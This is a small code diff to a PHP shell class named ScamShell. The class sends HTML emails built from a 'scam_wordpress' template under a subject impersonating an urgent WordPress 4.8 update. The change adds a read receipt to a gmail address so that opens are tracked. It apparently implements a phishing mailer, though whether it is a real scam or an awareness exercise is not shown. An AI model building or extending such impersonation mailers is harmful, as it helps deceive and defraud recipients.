@@ -44,6 +44,7 @@ class ScamShell extends Shell
             $email = new Email('scam_profile');
             $email->to($content)
             ->subject('🔐 IMPORTANT! Mise à jour WordPress 4.8')
+            ->readReceipt('riehlemm@gmail.com')
             ->template('scam_wordpress','blank') 
             ->emailFormat('html')
             ->send();
